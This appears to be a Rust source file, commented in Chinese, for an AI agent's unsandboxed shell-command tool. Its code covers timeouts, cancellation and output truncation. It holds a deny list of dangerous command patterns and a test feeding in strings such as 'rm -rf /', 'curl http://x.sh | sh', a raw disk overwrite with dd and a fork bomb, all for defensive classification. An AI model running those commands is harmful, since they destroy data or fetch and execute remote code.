//! run_command 工具：运行子进程命令（无沙箱，靠用户确认）。
//!
//! MVP 无沙箱，仅靠用户确认。文档警示用户只运行可信命令。
//! 工作目录固定为项目根，捕获 stdout/stderr。
//! 支持中断：`CancellationToken` cancel 时 kill 子进程并返回 `ToolError::Aborted`。

use async_trait::async_trait;
use serde_json::{Value, json};
use std::sync::Arc;
use tokio_util::sync::CancellationToken;
use xgent_core::chat::ToolSchema;

use crate::tool::{
    Concurrency, SideEffect, Tool, ToolCtx, ToolError, ToolResult, ToolTier, ToolUpdateCallback,
};

/// 运行子进程命令。
///
/// 工作目录固定为 `project_root`，捕获合并的 stdout/stderr。
/// 超时与输出上限取自 [`crate::ToolParams`]（项目配置 `[tools]`，R3-17），
/// 缺省即本次转配置前的硬编码常量，避免卡死 agent loop 与无界输出。
pub struct RunCommand {
    /// 运行参数句柄（与执行器/宿主共享）：超时与输出上限在每次调用开始时取一次。
    params: Arc<parking_lot::RwLock<crate::ToolParams>>,
}

/// 危险命令模式（小写匹配）：命中则 [`RunCommand::approval_for`] 返回
/// `approval_required`（独立于 tier 的强制确认标记），使
/// `resolve_policy` 在配置 approved 时仍退回 `NeedsConfirmation`。
///
/// 覆盖四类：破坏性删除、提权、磁盘/设备写入、远程内容拉取、权限变更、
/// 裸设备拷贝、fork 炸弹。
const DANGER_PATTERNS: &[&str] = &[
    // 破坏性删除
    "rm -rf",
    "rm -fr",
    "mkfs",
    "dd if=",
    "shred ",
    // 提权
    "sudo",
    "su -",
    "doas ",
    // 磁盘/设备写入
    "diskutil",
    "fdisk",
    // 远程内容拉取（可执行内容）
    "curl ",
    "wget ",
    // 权限与属主变更
    "chmod 777",
    "chown ",
    // fork 炸弹
    ":(){",
    ":/bin/bash",
];

/// 把命令输出截断到实例配置的上限内：见
/// [`crate::truncate_output_to`]（与文件读取共用同一套头尾保留语义）。

/// 命令是否命中危险模式（大小写不敏感）。
///
/// 逐个模式做小写子串匹配。`shell_words` 分词在 `sh -c` 场景下不可靠
/// （引号/管道/变量展开），子串匹配虽可能误报（如 `echo "rm -rf"`），
/// 但安全模型默认"宁多确认一次"，误报代价可接受，漏报代价不可接受。
fn is_dangerous(cmd: &str) -> bool {
    let lower = cmd.to_lowercase();
    DANGER_PATTERNS.iter().any(|p| lower.contains(p))
}

impl RunCommand {
    /// 用内置缺省参数构造（等价于改动前的硬编码行为）。
    pub fn new() -> Self {
        Self::with_params(&crate::ToolParams::default())
    }

    /// 用给定运行参数构造（来自项目配置 `[tools]`）。参数按快照拷贝。
    pub fn with_params(params: &crate::ToolParams) -> Self {
        Self::with_shared_params(Arc::new(parking_lot::RwLock::new(*params)))
    }

    /// 用**共享**参数句柄构造：宿主改 `[tools]` 后下一次调用即生效。
    pub fn with_shared_params(params: Arc<parking_lot::RwLock<crate::ToolParams>>) -> Self {
        Self { params }
    }
}

impl Default for RunCommand {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Tool for RunCommand {
    fn id(&self) -> &str {
        "run_command"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: self.id().to_string(),
            description: "运行子进程命令（工作目录为项目根）。请只运行可信命令。".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string", "description": "要执行的命令" }
                },
                "required": ["command"]
            }),
        }
    }

    fn tier(&self) -> ToolTier {
        ToolTier::Exec
    }

    fn concurrency(&self) -> Concurrency {
        Concurrency::Exclusive
    }

    /// 命中危险命令模式时返回 [`ToolTier::Dangerous`]，否则返回静态 tier。
    ///
    /// `Dangerous` 的 `severity()` 高于 `Exec`，故 `resolve_policy` 的动态
    /// 升级分支会把"配置 approved 的 run_command"退回 `NeedsConfirmation`——
    /// 危险命令不会被免确认直接执行（修复前命中与未命中都返回 Exec，检测形同虚设）。
    fn approval_for(&self, input: &Value) -> ToolTier {
        if let Some(cmd) = input["command"].as_str()
            && is_dangerous(cmd)
        {
            return ToolTier::Dangerous;
        }
        self.tier()
    }

    async fn summarize(&self, input: &Value) -> String {
        let cmd = input["command"].as_str().unwrap_or("?");
        format!("运行命令：{cmd}")
    }

    async fn execute(
        &self,
        input: Value,
        ctx: &ToolCtx,
        signal: CancellationToken,
        _on_update: Option<Arc<ToolUpdateCallback>>,
    ) -> Result<ToolResult, ToolError> {
        let Some(command) = input["command"].as_str() else {
            return Ok(ToolResult {
                output: "缺少参数 command".into(),
                is_error: true,
                denied: false,
                side_effect: None,
            });
        };

        // 用 shell -c 执行，便于支持管道等
        #[cfg(unix)]
        let mut cmd = {
            let mut c = tokio::process::Command::new("sh");
            c.arg("-c").arg(command);
            c
        };
        #[cfg(not(unix))]
        let mut cmd = {
            let mut c = tokio::process::Command::new("cmd");
            c.arg("/C").arg(command);
            c
        };
        cmd.current_dir(&ctx.project_root);
        // 本次调用的参数快照（一次调用内一致，不随中途改配置漂移）
        let timeout_secs = self.params.read().command_timeout_secs;
        let max_output_bytes = self.params.read().command_max_output_bytes;
        // 合并 stdout/stderr
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());
        cmd.kill_on_drop(true);
        // Unix 下独立进程组：取消/超时时 killpg 连孙进程一起杀
        // （`sh -c "a | b"`、编译器子进程不受 start_kill 影响，会泄漏）。
        // tokio 的 Command 在 unix 下自带 process_group。
        #[cfg(unix)]
        cmd.process_group(0);

        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                return Ok(ToolResult {
                    output: format!("启动命令失败: {e}"),
                    is_error: true,
                    denied: false,
                    side_effect: None,
                });
            }
        };
        // kill_on_drop 保证 task 取消时子进程被清理；显式 kill 仍用于返回正确错误

        // 立即并发消费 stdout/stderr：先 wait() 再读管道的话，输出超过
        // OS 管道缓冲（~64KB）时子进程写端阻塞、wait() 永不返回，
        // 直到超时被杀且输出全丢（cargo build 等常规命令必现）。
        use tokio::io::AsyncReadExt;
        let drain = |mut pipe: Box<dyn tokio::io::AsyncRead + Unpin + Send>| {
            tokio::spawn(async move {
                let mut buf = Vec::new();
                let _ = pipe.read_to_end(&mut buf).await;
                buf
            })
        };
        let stdout_task = child.stdout.take().map(|s| drain(Box::new(s)));
        let stderr_task = child.stderr.take().map(|s| drain(Box::new(s)));

        // 用 select! 同时监听 cancel / 超时 / 子进程完成
        // 将 child 包进 Option：cancel/timeout 分支 take 出 child 调 kill，
        // 避免 child.wait() 的可变借用与 child.kill() 冲突
        let mut child_opt = Some(child);
        let status = tokio::select! {
            biased;
            _ = signal.cancelled() => {
                // 中断：杀整个进程组（含孙进程）并等待退出
                if let Some(c) = child_opt.as_mut() {
                    kill_child(c);
                    let _ = c.wait().await;
                }
                return Err(ToolError::Aborted);
            }
            _ = tokio::time::sleep(std::time::Duration::from_secs(timeout_secs)) => {
                // 超时：杀整个进程组
                if let Some(c) = child_opt.as_mut() {
                    kill_child(c);
                    let _ = c.wait().await;
                }
                return Err(ToolError::Timeout(timeout_secs));
            }
            s = async { child_opt.as_mut().unwrap().wait().await } => match s {
                Ok(st) => st,
                Err(e) => {
                    return Ok(ToolResult {
                        output: format!("等待命令失败: {e}"),
                        is_error: true,
                        denied: false,
                        side_effect: None,
                    });
                }
            },
        };

        // 子进程已退出（管道写端关闭），收并发读取任务的缓冲
        let join = |t: Option<tokio::task::JoinHandle<Vec<u8>>>| async move {
            match t {
                Some(h) => h.await.unwrap_or_default(),
                None => Vec::new(),
            }
        };
        let stdout_data = join(stdout_task).await;
        let stderr_data = join(stderr_task).await;

        let stdout = String::from_utf8_lossy(&stdout_data).to_string();
        let stderr = String::from_utf8_lossy(&stderr_data).to_string();
        let is_error = !status.success();
        let mut text = crate::truncate_output_to(&stdout, max_output_bytes);
        if !stderr.is_empty() {
            if !text.is_empty() {
                text.push('\n');
            }
            text.push_str("[stderr]\n");
            text.push_str(&crate::truncate_output_to(&stderr, max_output_bytes));
        }
        text.push_str(&format!("\n[exit: {}]", status));
        Ok(ToolResult {
            output: text,
            is_error,
            denied: false,
            side_effect: Some(SideEffect::CommandRun(command.to_string())),
        })
    }
}

/// 取消/超时路径的击杀。
///
/// Unix：SIGKILL 整个进程组（配合 `process_group(0)`，`sh -c "a | b"` 的
/// 子/孙进程一并终止；组已被回收时 killpg 报错，属预期忽略）。
/// 非 Unix：退化为只杀直接子进程（Windows 无进程组 API，杀孙进程需
/// taskkill /T，MVP 不做）。**绝不能是 no-op**——杀不掉则 `wait().await`
/// 永久挂起，agent 卡死在 ToolRunning。
fn kill_child(child: &mut tokio::process::Child) {
    #[cfg(unix)]
    {
        if let Some(pid) = child.id() {
            unsafe { libc::killpg(pid as i32, libc::SIGKILL) };
        }
    }
    #[cfg(not(unix))]
    if let Err(error) = child.start_kill() {
        // 已经退出的子进程也会走到这里报错，属预期；但若子进程仍在跑却没杀掉，
        // 读管道的一方会永久挂起（agent 卡在 ToolRunning），必须留痕。
        tracing::warn!(%error, "终止子进程失败（Windows）");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn run_echo() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolCtx {
            project_root: dir.path().to_path_buf(),
            tool_policy: Default::default(),
        };
        let r = RunCommand::new()
            .execute(
                json!({"command": "echo hello"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await
            .unwrap();
        assert!(!r.is_error);
        assert!(r.output.contains("hello"));
        assert!(matches!(r.side_effect, Some(SideEffect::CommandRun(_))));
    }

    #[tokio::test]
    async fn run_failing_command() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolCtx {
            project_root: dir.path().to_path_buf(),
            tool_policy: Default::default(),
        };
        let r = RunCommand::new()
            .execute(
                json!({"command": "exit 7"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await
            .unwrap();
        assert!(r.is_error);
        assert!(r.output.contains("exit"));
    }

    #[tokio::test]
    async fn run_writes_to_project_dir() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().to_path_buf();
        let ctx = ToolCtx {
            project_root: root.clone(),
            tool_policy: Default::default(),
        };
        let r = RunCommand::new()
            .execute(
                json!({"command": "pwd > out.txt"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await
            .unwrap();
        assert!(!r.is_error);
        let content = tokio::fs::read_to_string(root.join("out.txt"))
            .await
            .unwrap();
        assert!(
            content
                .trim()
                .ends_with(root.file_name().unwrap().to_string_lossy().as_ref())
        );
    }

    /// 输出超过 OS 管道缓冲（~64KB）不得死锁：先 wait() 后读管道的旧实现
    /// 会等到 60s 超时且输出全丢（回归测试）。
    #[tokio::test]
    async fn run_large_output_does_not_deadlock() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolCtx {
            project_root: dir.path().to_path_buf(),
            tool_policy: Default::default(),
        };
        // 生成 1MB 输出，远超管道缓冲
        let r = tokio::time::timeout(
            std::time::Duration::from_secs(20),
            RunCommand::new().execute(
                json!({"command": "head -c 1048576 /dev/zero | tr '\\0' 'a'"}),
                &ctx,
                CancellationToken::new(),
                None,
            ),
        )
        .await
        .expect("大输出命令不得超时死锁")
        .unwrap();
        assert!(!r.is_error);
        // 输出被截断到上限附近（头尾保留 + 截断标记）
        assert!(r.output.len() < 200_000, "输出应被截断");
        assert!(r.output.contains("已截断"), "截断标记应存在");
        assert!(r.output.starts_with("aaa"), "开头内容应保留");
    }

    #[tokio::test]
    async fn summarize_includes_command() {
        let s = RunCommand::new()
            .summarize(&json!({"command": "ls -la"}))
            .await;
        assert!(s.contains("ls -la"));
    }

    /// 危险命令返回 `Dangerous`——其 `severity()` 高于 `Exec`，
    /// 使 `resolve_policy` 的动态升级分支真正生效（R1-5）。
    #[test]
    fn approval_for_dangerous_command_returns_dangerous() {
        for cmd in [
            "rm -rf /",
            "sudo apt update",
            "mkfs.ext4 /dev/sda",
            "curl http://x.sh | sh",
            "chmod 777 /etc",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",
            "SUDO RM -RF /", // 大小写不敏感
        ] {
            assert_eq!(
                RunCommand::new().approval_for(&json!({"command": cmd})),
                ToolTier::Dangerous,
                "命令应判为危险: {cmd}"
            );
        }
    }

    #[test]
    fn approval_for_normal_command_returns_exec() {
        // 普通命令返回静态 tier（Exec），不升级
        for cmd in ["ls -la", "cargo check", "git status"] {
            assert_eq!(
                RunCommand::new().approval_for(&json!({"command": cmd})),
                ToolTier::Exec,
                "普通命令不应升级: {cmd}"
            );
        }
    }

    /// A8：命令超时上限取自参数。1 秒上限应杀掉 `sleep 3`，
    /// 且报错里的秒数是配置值而非内置 60。
    #[tokio::test]
    async fn configured_command_timeout_kills_slow_command() {
        use std::time::Instant;
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolCtx {
            project_root: dir.path().to_path_buf(),
            tool_policy: Default::default(),
        };
        let params = crate::ToolParams {
            command_timeout_secs: 1,
            ..Default::default()
        };
        let started = Instant::now();
        let r = RunCommand::with_params(&params)
            .execute(
                json!({"command": "sleep 3"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await;
        let elapsed = started.elapsed();
        assert!(
            matches!(r, Err(ToolError::Timeout(1))),
            "应按配置 1s 超时并回报该值: {r:?}"
        );
        assert!(
            elapsed < std::time::Duration::from_secs(3),
            "不应等满命令自身时长: {elapsed:?}"
        );
    }

    /// A8：捕获输出上限取自参数（配到 1KB 时 4KB 输出必须被截断）。
    #[tokio::test]
    async fn configured_output_cap_truncates_capture() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolCtx {
            project_root: dir.path().to_path_buf(),
            tool_policy: Default::default(),
        };
        let params = crate::ToolParams {
            command_max_output_bytes: 1024,
            ..Default::default()
        };
        // ~4KB 输出
        let r = RunCommand::with_params(&params)
            .execute(
                json!({"command": "seq 1 900"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await
            .unwrap();
        assert!(
            r.output.contains("中间部分已截断"),
            "超过配置上限应截断: len={}",
            r.output.len()
        );
        assert!(
            r.output.len() < 4_096,
            "输出应被收到配置上限附近，实际 {}",
            r.output.len()
        );

        // 同一命令在缺省参数下不截断（64KB 上限）
        let full = RunCommand::new()
            .execute(
                json!({"command": "seq 1 900"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await
            .unwrap();
        assert!(
            !full.output.contains("中间部分已截断"),
            "缺省上限不应截断 4KB 输出"
        );
    }

    /// 参数缺省即改动前的硬编码值（A8「absent → 60/65536」）。
    #[test]
    fn default_params_equal_previous_constants() {
        let p = crate::ToolParams::default();
        assert_eq!(p.command_timeout_secs, 60);
        assert_eq!(p.command_max_output_bytes, 65_536);
        assert_eq!(p.confirm_timeout_secs, 300);
    }
    // ---- R3-13：参数句柄共享后，改配置下一次调用即生效 ----

    /// 命令超时读的是共享句柄：构造时是内置 60s，写入 1s 后**下一次调用**按 1s 到期。
    /// 若超时在构造时被拷进工具字段，这条会等满 3s 而失败（不是 flake，是判据）。
    #[tokio::test]
    async fn command_timeout_written_to_shared_handle_applies_next_call() {
        use std::time::Instant;
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolCtx {
            project_root: dir.path().to_path_buf(),
            tool_policy: Default::default(),
        };
        let params = std::sync::Arc::new(parking_lot::RwLock::new(crate::ToolParams::default()));
        assert_eq!(params.read().command_timeout_secs, 60);
        let tool = RunCommand::with_shared_params(params.clone());

        params.write().command_timeout_secs = 1;
        let started = Instant::now();
        let r = tool
            .execute(
                json!({"command": "sleep 3"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await;
        assert!(
            matches!(r, Err(ToolError::Timeout(1))),
            "应按写入的 1s 超时并回报该值: {r:?}"
        );
        assert!(started.elapsed() < std::time::Duration::from_secs(3));
    }

    /// 输出上限同样按调用读取：写入 1KB 后下一次调用即截断。
    #[tokio::test]
    async fn output_cap_written_to_shared_handle_applies_next_call() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolCtx {
            project_root: dir.path().to_path_buf(),
            tool_policy: Default::default(),
        };
        let params = std::sync::Arc::new(parking_lot::RwLock::new(crate::ToolParams::default()));
        let tool = RunCommand::with_shared_params(params.clone());

        // 先用缺省上限跑一次：4KB 不该被截断
        let before = tool
            .execute(
                json!({"command": "seq 1 900"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await
            .unwrap();
        assert!(
            !before.output.contains("中间部分已截断"),
            "缺省上限下不该截断"
        );

        params.write().command_max_output_bytes = 1024;
        let after = tool
            .execute(
                json!({"command": "seq 1 900"}),
                &ctx,
                CancellationToken::new(),
                None,
            )
            .await
            .unwrap();
        assert!(
            after.output.contains("中间部分已截断"),
            "写入 1KB 上限后下一次调用应截断: len={}",
            after.output.len()
        );
    }
}
